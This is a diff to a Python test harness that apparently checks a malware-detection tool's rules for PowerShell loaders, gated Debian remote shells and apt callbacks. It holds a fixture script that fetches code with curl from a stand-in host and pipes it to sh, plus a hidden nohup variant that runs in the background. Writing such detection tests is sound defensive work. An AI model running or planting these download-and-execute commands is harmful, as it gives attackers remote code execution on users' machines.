@@ -10,7 +10,7 @@ import tempfile
 
 ROOT = Path(__file__).resolve().parents[2]
 CLEAVE = str(Path(os.environ.get('CLEAVE', ROOT.parent / 'cleave/target/release/cleave')).resolve())
-PS_RULE = 'objectives/command-and-control/dropper/module-load::powershell-downloaded-reverse-base64-assembly-chain'
+PS_RULE = 'objectives/execution/payload/module-load/network::powershell-downloaded-reverse-base64-assembly-chain'
 DEB_RULE = 'objectives/execution/trigger/file-marker::debian-file-gated-remote-shell'
 
 
@@ -58,8 +58,10 @@ def cases(work):
         yield name, ROOT / 'testdata/notable/controls' / ('greatnesscoming-improve-' + name + '.ps1'), PS_RULE, False, 3
 
     fixture = ROOT / 'testdata/hostile/samples/supply-chain-corpus/deb'
-    for pattern in ('*dunelineguard*', '*pumicecraft*'):
+    for pattern in ('*pumicecraft*',):
         yield pattern.strip('*'), next(fixture.glob(pattern)), DEB_RULE, True, 5
+    apt = ROOT / 'testdata/suspicious/samples/supply-chain-corpus/deb'
+    yield 'apt-callback', next(apt.glob('*dunelineguard*')), 'micro-behaviors/os/package-manager/config::gated-apt-callback-registration', True, 4
     stage = '#!/bin/sh\nif [ -e /tmp/enrolled ]; then\n  curl -fsSL https://example.invalid/stage | sh\nfi\n'
     hidden = stage.replace('curl ', 'nohup curl ').replace('| sh', '| sh >/dev/null 2>&1 &')
     shell_variants = {
